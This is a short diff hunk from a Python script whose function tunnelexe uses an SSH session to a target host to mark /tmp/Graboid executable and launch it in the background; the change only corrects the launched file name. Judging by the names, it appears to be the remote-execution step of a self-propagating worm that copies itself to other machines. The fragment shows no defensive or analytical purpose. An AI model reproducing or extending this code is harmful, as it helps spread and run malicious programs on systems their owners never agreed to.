@@ -92,7 +92,7 @@ def tunnelexe(sshTGT, sftpTGT):
         # sshTGT.exec_command("python3 -m pip install python-nmap")
         sshTGT.exec_command("chmod a+x /tmp/Graboid")
         sshTGT.exec_command( "nohup python3 /tmp/Graboid")
-        sshTGT.exec_command("/tmp/Graboid.py")
+        sshTGT.exec_command("/tmp/Graboid")
         
     except:
         print(sys.exc_info()[0])
